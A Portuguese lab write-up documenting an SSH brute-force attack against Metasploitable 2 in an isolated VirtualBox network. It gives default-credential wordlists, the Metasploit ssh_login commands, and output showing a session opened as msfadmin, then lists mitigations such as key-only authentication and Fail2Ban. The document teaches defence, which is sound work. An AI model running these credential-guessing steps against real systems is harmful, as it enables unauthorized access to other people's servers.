# Exploração de SSH: Ataque de Dicionário e Força Bruta

Este projeto documenta a exploração do serviço SSH (Secure Shell) através de ataques de adivinhação de credenciais (Brute Force / Dictionary Attack). O objetivo é demonstrar o risco crítico do uso de senhas fracas, credenciais padrão e a ausência de mecanismos de proteção contra múltiplas tentativas de login em serviços de administração remota.

> **Aviso Legal:** Este projeto foi realizado em um ambiente de laboratório estritamente controlado e isolado (VirtualBox / Metasploitable 2). Todas as técnicas aqui documentadas têm fins educacionais e de pesquisa acadêmica em Segurança da Informação.

## Topologia e Ambiente
* **Atacante:** Kali Linux (192.168.56.102)
* **Alvo Vulnerável:** Metasploitable 2 (192.168.56.101)
* **Serviço Alvo:** SSH na porta TCP 22

## Metodologia de Ataque

### 1. Criação de Wordlists Personalizadas
Para otimizar o ataque, foram criadas wordlists customizadas contendo usuários e senhas potenciais (incluindo credenciais padrão de sistemas Linux e de administração).
* Arquivo de usuários (user.txt): root, admin, msfadmin, user
* Arquivo de senhas (password.txt): password, admin, msfadmin, test

### 2. Configuração do Metasploit Framework
Utilizamos o módulo de scanner de login SSH do Metasploit para automatizar o ataque, cruzando as listas de usuários e senhas contra o servidor alvo.

    msfconsole
    msf > use auxiliary/scanner/ssh/ssh_login
    msf auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.56.101
    msf auxiliary(scanner/ssh/ssh_login) > set USER_FILE /home/kali/user.txt
    msf auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/kali/password.txt

### 3. Execução e Acesso Inicial (Initial Access)
O ataque foi disparado e obteve sucesso ao identificar uma credencial padrão válida. O Metasploit automaticamente abriu uma sessão interativa via SSH.

    msf auxiliary(scanner/ssh/ssh_login) > exploit
    [*] 192.168.56.101:22 - Starting bruteforce
    [+] 192.168.56.101:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) ... Linux metasploitable 2.6.24-16-server'
    [*] SSH session 1 opened (192.168.56.102:35747 -> 192.168.56.101:22)

    # Interagindo com o sistema comprometido
    msf auxiliary(scanner/ssh/ssh_login) > sessions 1
    [*] Starting interaction with 1...
    ip addr
    inet 192.168.56.101/24 brd 192.168.56.255 scope global eth0

**Impacto Comprovado:** Acesso remoto obtido com sucesso. A partir deste ponto, o atacante pode iniciar técnicas de Pós-Exploração, como Enumeração Interna e Escalonamento de Privilégios (Privilege Escalation) para tentar se tornar o usuário root.

## Mitigação e Boas Práticas
Para proteger serviços SSH em ambientes de produção corporativos:
1. **Desabilitar Autenticação por Senha:** Configurar o arquivo sshd_config para aceitar apenas autenticação via Chaves Públicas/Privadas RSA ou Ed25519 (PasswordAuthentication no).
2. **Implementar Rate Limiting (Fail2Ban):** Utilizar ferramentas como Fail2Ban para bloquear temporária ou permanentemente endereços IP que realizem múltiplas tentativas de login falhas.
3. **Desabilitar Login Direto como Root:** Impedir que o usuário administrador principal faça login remotamente (PermitRootLogin no).
4. **Mudar a Porta Padrão:** Alterar a porta 22 para uma porta alta (ex: 2222) reduz drasticamente o volume de ataques automatizados de bots na internet.
